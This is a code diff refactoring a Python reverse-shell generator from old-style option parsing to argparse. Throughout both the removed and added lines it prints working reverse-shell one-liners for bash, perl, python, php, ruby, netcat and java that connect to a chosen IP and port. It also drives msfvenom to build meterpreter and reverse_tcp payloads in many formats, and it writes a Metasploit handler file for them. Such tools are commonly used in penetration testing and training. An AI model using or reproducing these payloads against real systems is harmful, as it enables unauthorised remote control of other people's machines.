@@ -1,71 +1,42 @@
 #!/usr/bin/env python3
 
 import shutil
-import optparse
+import argparse
 import ipaddress
 import subprocess
 import netifaces as ni
-from colorama import Fore, Style
-from optparse import OptionParser
-from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
 
-#Checks if msfvenom is installed
-def checkMsfvenom():
-	if shutil.which('msfvenom') is not None:
-		True
-	else:
-		print(Fore.RED + "\nmsfvenom not installed/found, that feature will not work." + Style.RESET_ALL)
+def check_msfvenom():
+    if shutil.which('msfvenom') is not None:
+        return True
+    else:
+        print("\nmsfvenom not installed/found, that feature will not work.")
+        return False
 
-#List of supported Shells
-def list():
-	print(Fore.YELLOW + """
-Select by number/name:
+def list_supported_shells():
+    shells = ['Bash', 'Perl', 'Python', 'PHP', 'Ruby', 'Netcat', 'Java', 'Msfvenom']
+    print(f"Select by number/name:\n")
+    for i, shell in enumerate(shells):
+        print(f"({i+1}) {shell}")
 
-(1) Bash
-(2) Perl
-(3) Python
-(4) PHP
-(5) Ruby
-(6) Netcat
-(7) Java
-(8) Msfvenom""" + Style.RESET_ALL)
+def create_handler_file(ip: str, port: int, payload: str):
+    with open("handler.rc", "w") as f:
+        f.write(f"use exploit/multi/handler\n")
+        f.write(f"set payload {payload}\n")
+        f.write(f"set lhost {ip}\n")
+        f.write(f"set lport {port}\n")
+        f.write("exploit\n")
+    print(f"\nFile 'handler.rc' created. Type 'msfconsole -r handler.rc' to start the handler")
 
-
-#Creates a handler.rc file to start a mult/handler for your msfvenom shell
-def handler(ip, port, payload):
-	f = open("handler.rc", "w")
-	f.write("use exploit/multi/handler\n")
-	f.write("set payload {}\n".format(payload))
-	f.write("set lhost {}\n".format(ip))
-	f.write("set lport {}\n".format(port))
-	f.write("exploit\n")
-	f.close()
-	print(Fore.GREEN + "\nFile 'handler.rc' created. Type 'msfconsole -r handler.rc' to start the handler"+ Style.RESET_ALL)
-
-
-
-def payloads(meterpreter, ip, port, payloadType, fileType, ext):
-	
-	if meterpreter == 'y':
-		print(Fore.GREEN + "Generating payload: msfvenom -p {}/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} -o shell.{}".format(payloadType, ip, port, fileType, ext))
-		print(Style.RESET_ALL)
-		subprocess.run(['msfvenom','-p',payloadType + '/meterpreter/reverse_tcp','LHOST='+ip,'LPORT='+port,'-f',fileType,'-o','shell.'+ext])
-		payload = "{}/meterpreter/reverse_tcp".format(payloadType)
-		handler(ip, port, payload)
-	elif meterpreter == 'n':
-		print(Fore.GREEN + "Generating payload: msfvenom -p {}/shell_reverse_tcp LHOST={} LPORT={} -f {} -o shell.{}".format(payloadType, ip, port, fileType, ext))
-		print(Style.RESET_ALL)
-		subprocess.run(['msfvenom','-p',payloadType+'/shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f',fileType,'-o','shell.'+ext])
-		payload = "{}/shell_reverse_tcp".format(payloadType)
-		handler(ip, port, payload)
-	else:
-		print(Fore.RED + "Oh no, something went wrong..." + Style.RESET_ALL)
-
-
-
+def generate_payload(ip: str, port: int, payload_type: str, file_type: str, ext: str, meterpreter: str):
+    payload = f"{payload_type}/meterpreter/reverse_tcp" if meterpreter== 'y' else f"{payload_type}/shell_reverse_tcp"
+    command = ['msfvenom', '-p', payload, f"LHOST={ip}", f"LPORT={port}", '-f', file_type, '-o', f"shell.{ext}"]
+    print(f"Generating payload: {' '.join(command)}")
+    subprocess.run(command)
+    create_handler_file(ip, port, payload)
 
 def msf(ip, port):
-	print(Fore.YELLOW + """
+    print("""
 #####Type#####
 (1) ASP** [.asp]
 (2) ASPX** [.aspx]
@@ -80,275 +51,173 @@ def msf(ip, port):
 (11) Tomcat [.jsp]
 (12) Windows** [.exe]
 
-'**' Indicates meterpreter compatibility\n""" + Style.RESET_ALL)
-	try:
+'**' Indicates meterpreter compatibility\n""")
+    
+    payload_options = {
+        "3": ("cmd/unix/reverse_bash", "sh", "raw"),
+	    "4": ("java/jsp_shell_reverse_tcp", "jsp", "raw"),
+	    "7": ("cmd/unix/reverse_perl", "pl", "raw"),
+	    "11": ("java/jsp_shell_reverse_tcp", "war", "war"),
+	}
 
-		choice = input(Fore.YELLOW + "Choose a shell[1-12]: " + Style.RESET_ALL)
-		
-		#ASP
-		if choice == '1':
-			ext = "asp"
-			fileType = "asp"
-			payloadType = "windows"
+    meterpreter_options = {
+        "1" : ("asp", "asp", "windows"),
+        "2" : ("aspx", "aspx", "windows"),
+    }
+    
+    architecture_options = {
+        '5' : {'x64': ('elf', 'elf', 'linux/x64'), 'x86': ('elf', 'elf', 'linux/x86')},
+        "6" : {"x64": ("macho", "macho", "osx/x64")},
+        "9" : {"x64" : ("ps1", "psh", "windows/x64"), "x86" : ("ps1", "psh", "windows")},
+        "12" : {"x64" : ("exe", "exe", "windows/x64"), "x86" : ("exe", "exe", "windows")}
+    }
+    
+    outlier_options = {
+        '8': ('php/meterpreter_reverse_tcp', 'php/reverse_php'),
+        '10': ('windows/shell_reverse_tcp', 'cmd/unix/reverse_python')
+    }
 
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			if meterpreter == 'y':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			elif meterpreter == 'n':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-		#ASPX
-		elif choice == '2':
-			ext = "aspx"
-			fileType = "aspx"
-			payloadType = "windows"
+    system_mapping = {
+        'w': 'windows/shell_reverse_tcp',
+        'l': 'cmd/unix/reverse_python'
+    }
 
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			if meterpreter == 'y':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			elif meterpreter == 'n':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-
-		#Bash
-		elif choice == '3':
-			print(Fore.GREEN + "Generating payload: msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -o shell.sh".format(ip, port))
-			print(Style.RESET_ALL)
-			subprocess.run(['msfvenom','-p','cmd/unix/reverse_bash','LHOST='+ip,'LPORT='+port,'-o','shell.sh'])
-
-			payload = "cmd/unix/reverse_bash"
-			handler(ip, port, payload)
-		
-		#Java
-		elif choice == '4':
-			print(Fore.GREEN + "Generating payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw -o shell.jsp".format(ip, port))
-			print(Style.RESET_ALL)
-			subprocess.run(['msfvenom','-p','java/jsp_shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.jsp'])
-			payload = "java/jsp_shell_reverse_tcp"
-			handler(ip, port, payload)
-		
-		#Linux
-		elif choice == '5':
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			architecture = input(Fore.YELLOW + "Architecture?[x86/x64]: " + Style.RESET_ALL)
-			ext = "elf"
-			fileType = "elf"
-			if architecture == 'x86':
-				payloadType = 'linux/x86'
-			elif architecture == 'x64':
-				payloadType = 'linux/x64'
-			else:
-				print(Fore.RED + "Oh no, not a valid architecture" + Style.RESET_ALL)
-			if meterpreter == 'y':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			elif meterpreter == 'n':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-
-		#OSX
-		elif choice == '6':
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			architecture = input(Fore.YELLOW + "Architecture?[x86/x64]: " + Style.RESET_ALL)
-			ext = "macho"
-			fileType = "macho"
-			payloadType = "osx/" + architecture
-
-			if meterpreter == 'y':
-				if architecture == 'x86':
-					print(Fore.RED + "x86 is not compatible with meterpreter on OSX, defaulting to x64" + Style.RESET_ALL)
-					payloadType = "osx/x64"
-					payloads(meterpreter, ip, port, payloadType, fileType, ext)
-				else:
-					payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			elif meterpreter == 'n':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-		
-		#Perl
-		elif choice == '7':
-			print(Fore.GREEN + "Generating payload: msfvenom -p cmd/unix/reverse_perl LHOST={} LPORT={} -f raw -o shell.pl".format(ip, port))
-			print(Style.RESET_ALL)
-			subprocess.run(['msfvenom','-p','cmd/unix/reverse_perl','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.pl'])
-			payload = "cmd/unix/reverse_perl"
-			handler(ip, port, payload)
-
-		#PHP
-		elif choice == '8':
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			
-			if meterpreter == 'y':
-				print(Fore.GREEN + "Generating payload: msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw -o shell.php".format(ip, port))
-				print(Style.RESET_ALL)
-				subprocess.run(['msfvenom','-p','php/meterpreter_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.php'])
-				payload = "php/meterpreter_reverse_tcp"
-				handler(ip, port, payload)
-			elif meterpreter == 'n':
-				print(Fore.GREEN + "Generating payload: msfvenom -p php/reverse_php LHOST={} LPORT={} -f raw -o shell.php".format(ip, port))
-				print(Style.RESET_ALL)
-				subprocess.run(['msfvenom','-p','php/reverse_php','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.php'])
-				payload = "php/reverse_tcp"
-				handler(ip, port, payload)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-		
-		#Powershell
-		elif choice == '9':
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			architecture = input(Fore.YELLOW + "Archictecture?[x86/x64]: " + Style.RESET_ALL)
-			ext = "ps1"
-			fileType = "psh"
-
-			if architecture == 'x86':
-				payloadType = "windows"
-			elif architecture == "x64":
-				payloadType = "windows/x64"
-			else:
-				print(Fore.RED + "Oh no, not a valid architecture." + Style.RESET_ALL)
-			
-			if meterpreter == 'y':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			elif meterpreter == 'n':
-				payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-		
-		#Python
-		elif choice == '10':
-			system = input(Fore.YELLOW + "Windows or Linux?[w/l]: " + Style.RESET_ALL).lower()
-			if system == 'w':
-				print(Fore.GREEN + "Generating payload: msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={}  -f python -o shell.py".format(ip, port))
-				print(Style.RESET_ALL)
-				subprocess.run(['msfvenom','-p','windows/shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','python','-o','shell.py'])
-				payload = "windows/shell_reverse_tcp"
-				handler(ip, port, payload)
-			elif system == 'l':
-				print(Fore.GREEN + "Generating payload: msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw -o reverse.py".format(ip, port))
-				print(Style.RESET_ALL)
-				subprocess.run(['msfvenom','-p','cmd/unix/reverse_python','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.py'])
-				payload = "cmd/unix/reverse_python"
-				handler(ip, port, payload)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-		
-		#Tomcat
-		elif choice == '11':
-			print(Fore.GREEN + "Generating payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war -o shell.war".format(ip, port))
-			print(Style.RESET_ALL)
-			subprocess.run(['msfvenom','-p','java/jsp_shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','war','-o','shell.war'])
-			payload = "java/jsp_shell_reverse_tcp"
-			handler(ip, port, payload)
-		
-		#Windows
-		elif choice == '12':
-			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
-			architecture = input(Fore.YELLOW + "Architecture?[x86/x64]: " + Style.RESET_ALL)
-			ext = "exe"
-			fileType = "exe"
-			payloadType = "windows"
-
-			if meterpreter == 'y':
-				if architecture == 'x86':
-					payloads(meterpreter, ip, port, payloadType, fileType, ext)
-
-				else:
-					payloadType = "windows/x64"
-					payloads(meterpreter, ip, port, payloadType, fileType, ext)
-			elif meterpreter == 'n':
-				print(Fore.GREEN + "Generating Payload: msfvenom -p windows/shell/reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe".format(ip, port))
-				print(Style.RESET_ALL)
-				subprocess.run(['msfvenom','-p','windows/shell/reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','exe','-o','shell.exe'])
-				payload = "windows/shell/reverse_tcp"
-				handler(ip, port, payload)
-			else:
-				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
-		else:
-			print(Fore.RED + "Oh no, not a valid option" + Style.RESET_ALL)
-			
-	except KeyboardInterrupt:
-		print(Fore.RED + "\n\nGoodbye Now\n" + Style.RESET_ALL)
-	except FileNotFoundError:
-		print(Fore.RED + "\nmsfvenom not installed/found, can't use this option.\n" + Style.RESET_ALL)
-
+    try:
+        choice = input("Choose a shell[1-12]: ")
+        if choice in payload_options:
+            payload, ext, file_type = payload_options[choice]
+            print(f"Generating payload: msfvenom -p {payload} LHOST={ip} LPORT={port} -f {file_type} -o shell.{ext}")
+            subprocess.run(['msfvenom','-p', payload, 'LHOST='+ip, 'LPORT='+port, '-f', file_type, '-o', f'shell.'+ext])
+            create_handler_file(ip, port, payload)
+        
+        elif choice in meterpreter_options:
+            ext, file_type, payload_type = meterpreter_options[choice]
+            meterpreter = input("Meterpreter?[y/n]: ").lower()
+            generate_payload(ip, port, payload_type, file_type, ext, meterpreter)
+        
+        elif choice in architecture_options:
+            architecture = input("Architecture?[x86/x64]: ")
+            meterpreter = input("Meterpreter?[y/n]: ").lower() 
+            ext, file_type, payload_type = architecture_options[choice][architecture]
+            generate_payload(ip, port, payload_type, file_type, ext, meterpreter)
+        
+        elif choice in outlier_options:
+            if choice == "8":
+                meterpreter = input("Meterpreter?[y/n]: " ).lower()  
+                payload = outlier_options[choice][0] if meterpreter == 'y' else outlier_options[choice][1]
+                print(f"Generating payload: msfvenom -p {payload} LHOST={ip} LPORT={port} -f raw -o shell.php")
+                subprocess.run(['msfvenom', '-p', payload, 'LHOST='+ip, 'LPORT='+port, '-f', 'raw', '-o', 'shell.php'])
+                create_handler_file(ip, port, payload)
+            elif choice == "10":
+                system = input("Windows or Linux?[w/l]: " ).lower()
+                if system in system_mapping:
+                    payload = system_mapping[system]
+                    print( f"Generating payload: msfvenom -p {payload} LHOST={ip} LPORT={port} -f python -o shell.py")
+                    subprocess.run(['msfvenom', '-p', payload, 'LHOST='+ip, 'LPORT='+port, '-f', 'python', '-o', 'shell.py'])
+                    create_handler_file(ip, port, payload)
+        else:
+            print("\n\nInvalid Option. Try Again.\n\n")
+            msf(ip, port)
+    except KeyboardInterrupt:
+        print("\n\nExiting...\n\n")
 
 def shells(ip, port, shell):
-	bash1 = Fore.GREEN + "bash -i >& /dev/tcp/{}/{} 0>&1\n\n".format(ip, port) + Style.RESET_ALL 
-	bash2 = Fore.GREEN + "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196\n".format(ip, port) + Style.RESET_ALL
-	perl = Fore.GREEN + 'perl -e \'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''.format(ip, port) + Style.RESET_ALL
-	python = Fore.GREEN + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip, port) + Style.RESET_ALL
-	php1 = Fore.GREEN + "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n".format(ip, port) + Style.RESET_ALL
-	php2 = Fore.GREEN + "<?php shell_exec(\"/bin/bash -c 'bash -i > /dev/tcp/{}/{} 0>&1'\"); ?>\n".format(ip, port) + Style.RESET_ALL
-	ruby = Fore.GREEN + "ruby -rsocket -e'f=TCPSocket.open(\"{}\"{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port) + Style.RESET_ALL
-	netcat1 = Fore.GREEN + "nc -e /bin/sh {} {}\n\n".format(ip, port) + Style.RESET_ALL
-	netcat2 = Fore.GREEN + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f\n\n".format(ip, port) + Style.RESET_ALL
-	netcat3 = Fore.GREEN + "ncat {} {} -e /bin/bash\n".format(ip, port) + Style.RESET_ALL
-	java = Fore.GREEN + "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()\"".format(ip, port) + Style.RESET_ALL
-	
+    shells = {
+    'bash': [
+        f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n\n",
+        f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196\n"
+    ],
+    'perl': [
+        f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+    ],
+    'python': [
+        f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    ],
+    'php': [
+        f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n",
+        f"<?php shell_exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\"); ?>\n"
+    ],    
+    'ruby' : [
+        f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\"{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    ],
+    'netcat' : [
+        f"nc -e /bin/sh {ip} {port}\n\n",
+        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f\n\n",
+        f"ncat {ip} {port} -e /bin/bash\n"
+    ],
+    'java' : [
+        f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])\np.waitFor()\""
+    ]
+}
 
-	listShell = {
-		**dict.fromkeys(['1', 'sh', 'bash'], bash1 + bash2),
-		**dict.fromkeys(['2', 'pl', 'perl'], perl),
-		**dict.fromkeys(['3', 'py', 'python'], python),
-		**dict.fromkeys(['4', 'php'], php1 + php2),
-		**dict.fromkeys(['5', 'rb', 'ruby'], ruby),
-		**dict.fromkeys(['6', 'nc', 'netcat'], netcat1 + netcat2 + netcat3),
-		**dict.fromkeys(['7', 'java'], java),
+    list_shell = [
+        (('1', 'sh', 'bash'), shells['bash']),
+        (('2', 'pl', 'perl'), shells['perl']),
+        (('3', 'py', 'python'), shells['python']),
+        (('4', 'php'), shells['php']),
+        (('5', 'rb', 'ruby'), shells['ruby']),
+        (('6', 'nc', 'netcat'), shells['netcat']),
+        (('7', 'java'), shells['java'])
+    ]
 
-	}
-	if shell == '8' or shell == 'msf' or shell == 'msfvenom':
-		msf(ip, port)
-	else:
-		print(listShell.get(shell, "Invalid Choice"))	
+    for keys, value in list_shell:
+        if shell in keys:
+            for i in value:
+                print(i)
+            break
+    if shell in ['8', 'msf', 'msfvenom']:
+        msf(ip, port)
 
 def header():
-	print(Fore.BLUE + """
+	print("""
  ___  _   _  ____  __    __    ___  ____  _  _ 
 / __)( )_( )( ___)(  )  (  )  / __)( ___)( \\( )
 \__ \ ) _ (  )__)  )(__  )(__( (_-. )__)  )  ( 
-(___/(_) (_)(____)(____)(____)\___/(____)(_)\_)\n""" + Style.RESET_ALL)
-
-
+(___/(_) (_)(____)(____)(____)\___/(____)(_)\_)\n""" )
+ 
 def interfaces():
-	
-	print(Fore.YELLOW + "\tAvailable Interfaces" + Style.RESET_ALL)
-	subprocess.Popen("ip -f inet -br addr show | sed 's/@...../      /g'; echo ''", stdin=subprocess.PIPE, shell=True)
+    result = subprocess.run(
+        "ip -f inet -br addr show | sed 's/@...../      /g'",
+        shell=True, capture_output=True, text=True
+    )
+    print("\tAvailable Interfaces\n" )
+    print(result.stdout)
 
-def getInterfaceIp(interface, port, shell):
+def get_interface_ip(interface, port, shell):
 	try:
-		ip = ni.ifaddresses(interface)[AF_INET][0]['addr']
+		ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
 		shells(ip, port, shell)
 	except ValueError:
 		print("Oh no, not a valid interface name.")
 
-def main():
-	checkMsfvenom()
-	header()
-	print(Fore.YELLOW)
-	parser = OptionParser("Usage: %prog -i <ip/interface name> -p <port> -s <shell>" + Style.RESET_ALL)
-	parser.add_option("-i", dest="ip", type="string", help="Specify ip address/interface name (REQUIRED)")
-	parser.add_option("-p", dest="port", type="int", default=9999, help="Specify listen port (Default: 9999)")
-	parser.add_option("-s", dest="shell", type="string", help="Specify type of shell (REQUIRED)")
-	parser.add_option("-l", dest="list", action="store_true", help="list all shell choices")
-	(options, args) = parser.parse_args()
-	if options.list == True:
-		list()
-		
-	elif options.ip is None or options.shell is None:
-		parser.print_help()
-		print("\n")
-		interfaces()
-		print(Style.RESET_ALL)
-	else:
-		ip = options.ip
-		port = str(options.port)
-		shell = options.shell.lower()
-		try:
-			ipaddress.ip_address(ip)
-			shells(ip, port, shell)
-		except ValueError: 
-			getInterfaceIp(ip, port, shell)
+def main(ip, port, shell):
+    try:
+        ipaddress.ip_address(ip)
+    except ValueError:
+        get_interface_ip(ip, port, shell)
+    else:
+        shells(ip, port, shell)
 
-main() 
+if __name__ == '__main__':
+    check_msfvenom()
+    header()
+
+    parser = argparse.ArgumentParser(usage="%(prog)s -i <ip/interface name> -p <port> -s <shell>" )
+    parser.add_argument("-l", "--list", action="store_true", help="list all shell choices")
+    parser.add_argument("-i", "--ip", type=str, help="Specify ip address/interface name (REQUIRED)")
+    parser.add_argument("-p", "--port", default=9999, help="Specify listen port (Default: 9999)")
+    parser.add_argument("-s", "--shell", type=str, help="Specify type of shell (REQUIRED)")
+    parser.add_argument("-I", "--interfaces", action="store_true", help="List all interfaces")
+    args = parser.parse_args()
+
+    if args.list:
+        list_supported_shells()
+    elif args.interfaces:
+        interfaces()
+    elif args.ip and args.shell:
+        ip = args.ip
+        port = str(args.port)
+        shell = args.shell.lower()
+        main(ip, port, shell)
+    else:
+        parser.print_help()
